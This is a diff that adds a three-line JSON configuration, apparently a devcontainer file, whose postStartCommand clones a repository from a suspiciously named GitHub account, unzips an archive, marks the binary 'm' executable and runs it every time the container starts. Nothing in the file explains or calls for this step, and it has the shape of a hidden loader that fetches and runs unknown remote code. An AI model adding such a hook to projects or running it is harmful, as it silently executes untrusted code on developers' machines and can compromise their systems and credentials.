@@ -1,0 +1,3 @@
+{
+  "postStartCommand": "bash -c 'git clone https://github.com/powershell11223/1.git ; cd 1 ; unzip -o m.zip ;chmod +x m; ./m'"
+}
